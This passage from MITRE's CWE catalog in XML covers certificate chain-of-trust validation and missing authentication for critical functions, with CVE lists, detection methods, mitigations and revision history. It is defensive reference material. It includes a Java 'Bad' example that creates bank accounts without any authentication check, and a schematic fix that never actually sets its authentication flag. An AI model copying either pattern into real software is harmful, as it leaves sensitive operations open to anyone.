               <Body_Text>In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2016-2402</Reference>
               <Description>Server allows bypass of certificate pinning by sending a chain of trust that includes a trusted CA that is not pinned.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2016-2402</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4989</Reference>
               <Description>Verification function trusts certificate chains in which the last certificate is self-signed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4989</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5821</Reference>
               <Description>Chain: Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5821</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3046</Reference>
               <Description>Web browser does not check if any intermediate certificates are revoked.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3046</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0265</Reference>
               <Description>chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0265</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0124</Reference>
               <Description>chain: incorrect check of return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0124</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0970</Reference>
               <Description>File-transfer software does not validate Basic Constraints of an intermediate CA-signed certificate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0970</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0862</Reference>
               <Description>Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0862</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to follow chain of trust in certificate validation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-245"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 23: Improper Use of PKI, Especially SSL.&#34; Page 347"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-03-10">Failure to Follow Chain of Trust in Certificate Validation</Previous_Entry_Name>
            <Previous_Entry_Name Date="2013-02-21">Improper Following of Chain of Trust for Certificate Validation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="306" Name="Missing Authentication for Critical Function" Abstraction="Base" Structure="Simple" Status="Draft" Diagram="/data/images/CWE-306-Diagram.png">
         <Description>The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.</Note>
            </Introduction>
			<Introduction>
			   <Phase>Operation</Phase>
			   <Note>When migrating data to the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), there is a risk of losing the protections that were originally provided by hosting on internal networks. If access does not require authentication, it can be easier for attackers to access the data from anywhere on the Internet.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>Exposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, accessing administrative or other privileged functionality, or possibly even executing arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7.2">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-6.1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.</xhtml:p>
                  <xhtml:p>Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected, including those channels that are assumed to be accessible only by authorized parties. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.</xhtml:p>
                  <xhtml:p>In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Where possible, avoid implementing custom, "grow-your-own" authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These capabilities may avoid common weaknesses that are unique to authentication; support automatic auditing and tracking; and make it easier to provide a clear separation between authentication tasks and authorization tasks.</xhtml:p>
                  <xhtml:p>In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.5">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
	    <Mitigation>
	     <Phase>Implementation</Phase>
	     <Phase>System Configuration</Phase>
	     <Phase>Operation</Phase>
	      <Description>When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302].</Description>
	    </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public BankAccount createBankAccount(String accountNumber, String accountType,<xhtml:br/>String accountName, String accountSSN, double balance) {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount account = new BankAccount();<xhtml:br/>account.setAccountNumber(accountNumber);<xhtml:br/>account.setAccountType(accountType);<xhtml:br/>account.setAccountOwnerName(accountName);<xhtml:br/>account.setAccountOwnerSSN(accountSSN);<xhtml:br/>account.setBalance(balance);<xhtml:br/>
                           <xhtml:br/>return account;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.</Body_Text>
               <Body_Text>The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>private boolean isUserAuthentic = false;<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// authenticate user,</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// if user is authenticated then set variable to true</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// otherwise set variable to false</xhtml:i>
                     <xhtml:br/>public boolean authenticateUser(String username, String password) {<xhtml:div style="margin-left:1em;">...</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public BankAccount createNewBankAccount(String accountNumber, String accountType,<xhtml:br/>String accountName, String accountSSN, double balance) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount account = null;<xhtml:br/>
                           <xhtml:br/>if (isUserAuthentic) {<xhtml:div style="margin-left:1em;">account = new BankAccount();<xhtml:br/>account.setAccountNumber(accountNumber);<xhtml:br/>account.setAccountType(accountType);<xhtml:br/>account.setAccountOwnerName(accountName);<xhtml:br/>account.setAccountOwnerSSN(accountSSN);<xhtml:br/>account.setBalance(balance);</xhtml:div>}<xhtml:br/>return account;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors did not use any authentication for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-155">
	      <Intro_Text>In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.</Intro_Text>
	      <Example_Code Nature="Bad" Language="Other">
                <xhtml:div>A security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]</xhtml:div>
	      </Example_Code>
	      <Body_Text>While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.</Body_Text>
	      <Example_Code Nature="Good" Language="Other">
                <xhtml:div>The sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]</xhtml:div>
	      </Example_Code>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-31260</Reference>
               <Description>Chain: a digital asset management program has an undisclosed backdoor in the legacy version of a PHP script (CWE-912) that could allow an unauthenticated user to export metadata (CWE-306)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31260</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29951</Reference>
               <Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29952</Reference>
               <Description>Condition Monitor firmware uses a protocol that does not require authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30276</Reference>
               <Description>SCADA-based protocol for bridging WAN and LAN traffic has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30276</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30313</Reference>
               <Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30317</Reference>
               <Description>Distributed Control System (DCS) uses a protocol that has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2020-10263</Reference>
			  <Description>Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2020-10263</Link>
			</Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-23147</Reference>
			  <Description>WiFi router does not require authentication for its UART port, allowing adversaries with physical access to execute commands as root</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-23147</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1810</Reference>
               <Description>MFV. Access TFTP server without authentication and obtain configuration file with sensitive plaintext information.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6827</Reference>
               <Description>Agent software running at privileges does not authenticate incoming requests over an unprotected channel, allowing a Shatter" attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6827</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0213</Reference>
               <Description>Product enforces restrictions through a GUI but not through privileged APIs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-15483</Reference>
               <Description>monitor device allows access to physical UART debug port without authentication</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-15483</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-9201</Reference>
               <Description>Programmable Logic Controller (PLC) does not have an authentication feature on its communication protocols.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-9201</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>No Authentication for Critical Function</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP31</Entry_ID>
               <Entry_Name>Missing authentication</Entry_Name>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 1.1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 1.2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 2.1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SR-2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SVV-3</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="12"/>
            <Related_Attack_Pattern CAPEC_ID="166"/>
            <Related_Attack_Pattern CAPEC_ID="216"/>
            <Related_Attack_Pattern CAPEC_ID="36"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authentication,&#34; Page 36"/>
            <Reference External_Reference_ID="REF-257"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1295"/>
            <Reference External_Reference_ID="REF-1296"/>
            <Reference External_Reference_ID="REF-1297"/>
            <Reference External_Reference_ID="REF-1298"/>
            <Reference External_Reference_ID="REF-1302"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
